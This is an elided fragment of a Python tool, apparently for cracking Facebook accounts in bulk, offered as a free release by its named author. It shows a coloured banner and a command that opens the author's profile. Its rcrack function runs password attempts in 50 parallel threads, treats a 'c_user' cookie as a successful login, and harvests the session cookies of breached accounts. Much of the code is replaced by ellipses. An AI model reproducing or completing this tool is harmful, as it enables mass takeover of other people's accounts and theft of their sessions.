...
logo = ("""\033[38;5;46m
 ...
 ╚══██╔══╝██╔══██╗██║  ██║██╔════╝██╔══██╗██║   ██║██║     
    ...
    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝   
\x1b[0;34m᯽⊱┈─╌❊❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙉𝘼𝙈𝙀\033[38;5;46m        : [★]  𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐕𝐀𝐈𝐘𝐀
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m    : [★]  ƬƛӇЄƊƲԼ ヽ・　T.T
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙂𝙄𝙏𝙃𝙐𝘽\033[38;5;46m      : [★]  𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐕𝐀𝐈𝐘𝐀     
...
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[38;5;46m: [★]  FREE  -𝗩. 0.2    
\x1b[0;34m᯽⊱┈─╌❊❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱""")
def linex():
	print('\033[38;5;46m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100088283424274')
    print(logo)
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m 𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐗')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [𝐓𝐀𝐇𝐄𝐃𝐔𝐋-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}𝐓𝐀𝐇𝐄𝐃𝐔𝐋{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
